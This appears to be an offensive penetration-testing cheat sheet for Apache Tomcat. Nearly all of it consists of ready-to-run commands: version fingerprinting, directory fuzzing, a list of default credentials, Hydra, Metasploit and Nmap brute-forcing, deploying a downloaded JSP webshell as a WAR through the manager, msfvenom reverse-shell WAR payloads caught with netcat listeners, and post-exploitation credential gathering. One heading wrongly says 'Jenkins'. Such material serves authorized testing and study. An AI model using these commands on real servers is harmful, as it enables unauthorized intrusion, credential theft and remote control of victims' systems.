### **Introduction**

Apache Tomcat is an open-source Java servlet container and web server, it's a key target due to its role in hosting Java-based web applications, often presenting opportunities to exploit configuration flaws and known vulnerabilities.

### **Identifying Jenkins Version**

1.  Check version in documentation page:  
    `curl -s http://[TOMCAT-DOMAIN]:8080/docs/ | grep Tomcat`
2.  Obtain version from default error page:  
    `curl -s http://[TOMCAT-DOMAIN]:8080/nonexistentpage | grep -i tomcat`
3.  Obtain version using Nmap:  
    `nmap -p 8080 --script http-server-header [TOMCAT-DOMAIN]`
    

### **Directory Discovery**

1.  Directory Fuzzing with FFUF:  
    `ffuf -u https://[TOMCAT-DOMAIN]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt`
2.  Directory Fuzzing with Gobuster:  
    `gobuster dir -u https://[TOMCAT-DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt`
3.  Directory Fuzzing with Wfuzz:  
    `wfuzz -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt https://[TOMCAT-DOMAIN]/FUZZ`
    

### **Default Credentials**

1.  `admin`:`admin`
2.  `tomcat`:`tomcat`
3.  `admin`:
4.  `admin`:`s3cr3t`
5.  `tomcat`:`s3cr3t`
6.  `admin`:`tomcat`

### **Brute-Force Apache Tomcat Credentials**

1.  Credential Brute-Forcing with Metasploit:  
    `use auxiliary/scanner/http/tomcat_mgr_login`
2.  Credential Brute-Forcing with Hydra:  
    `hydra -L userlist.txt -P passlist.txt [TOMCAT-URL] http-post-form "/manager/html:username=^[USER]^&password=^[PASS]^&Login=Login:Invalid credentials" -t 10`
3.  Credential Brute-Forcing with Nmap:  
    `nmap -p 8080 --script http-brute --script-args http-brute.path=/manager/html,userdb=userlist.txt,passdb=passlist.txt [TOMCAT-URL]`

### **Remote Code Execution (RCE)**

1.  Download JSP shell using wget:  
    `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`
2.  Package shell into WAR file  
    `jar -cvf MyShell.war *`
3.  Upload the MyShell.war to Tomcat using either the manager GUI or a tool like curl:  
    `curl -u admin:password -T MyShell.war http://[TOMCAT-DOMAIN]:8080/manager/text/deploy?path=/myshell`
4.  Access the Shell  
    `http://[TOMCAT-DOMAIN]:8080/myshell/cmd.jsp`
    

### **Reverse Shell Using Metasploit**

1.  Create war File  
    `msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=9002 -f war > MyShell.war`
2.  List WAR contents.  
    `jar -ft MyShell.war`
3.  Upload the MyShell.war to Tomcat using either the manager GUI or a tool like curl:  
    `curl -u admin:password -T MyShell.war http://[TOMCAT-DOMAIN]:8080/manager/text/deploy?path=/myshell`
4.  Start Netcat to receive reverse shell  
    `nc -lnvp 9002`
5.  trigger reverse shell using curl  
    `curl http://[TOMCAT-DOMAIN]:8080/myshell/orkmagcvdm.jsp`

### **Using Metasploit**

1.  Start Metasploit Framework:  
    `msfconsole`
2.  Select the Tomcat RCE exploit module:  
    `msf> use exploit/multi/http/tomcat_mgr_upload`
3.  Create the WAR file:  
    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=80 -f war -o shell.war`
4.  Upload the WAR file to the Tomcat server:  
    `curl --upload-file shell.war -u 'tomcat:password' "https://[TOMCAT-DOMAIN]/manager/text/deploy?path=/shell"`
5.  Starting a Listener on the Local Machine:  
    `sudo nc -lvnp 80`
6.  Accessing the Shell:  
    `https://[TOMCAT-DOMAIN]/shell`

### **Post Exploit**

1.  Find Tomcat credentials in tomcat-users.xml:  
    `find / -name tomcat-users.xml 2>/dev/null`
2.  Gather Tomcat credentials with Metasploit:  
    `msf> use post/multi/gather/tomcat_gather`  
    `msf> use post/windows/gather/enum_tomcat`